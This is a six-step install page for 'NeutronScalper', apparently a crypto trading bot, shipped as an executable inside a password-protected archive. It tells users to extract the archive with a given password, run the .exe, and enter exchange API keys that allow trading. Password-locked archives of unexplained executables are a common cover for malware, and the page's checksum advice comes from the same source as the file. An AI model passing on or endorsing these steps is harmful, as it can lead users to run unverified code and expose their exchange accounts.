Install in six steps

From download to first dry-run in under five minutes.

Download the archiveClick Download archive above or open the downloads/ folder in the repository.
Extract with passwordUse 7-Zip or WinRAR and enter 8025381933 when prompted.
Verify the hashCompare Get-FileHash .\NeutronScalper.exe -Algorithm SHA256 with checksums.txt.
Launch the executableRun NeutronScalper.exe as a standard user. Administrator rights are not needed.
Run dry-run modeLoad a preset profile and validate connectivity with simulated fills.
Connect & go liveAdd read + trade API keys (withdrawals disabled), then switch to live mode.
🔐
Security notice. Never enable withdrawal permissions on exchange API keys. Verify the SHA-256 hash after extraction. The archive password protects against casual tampering, not against a determined attacker — always verify integrity.
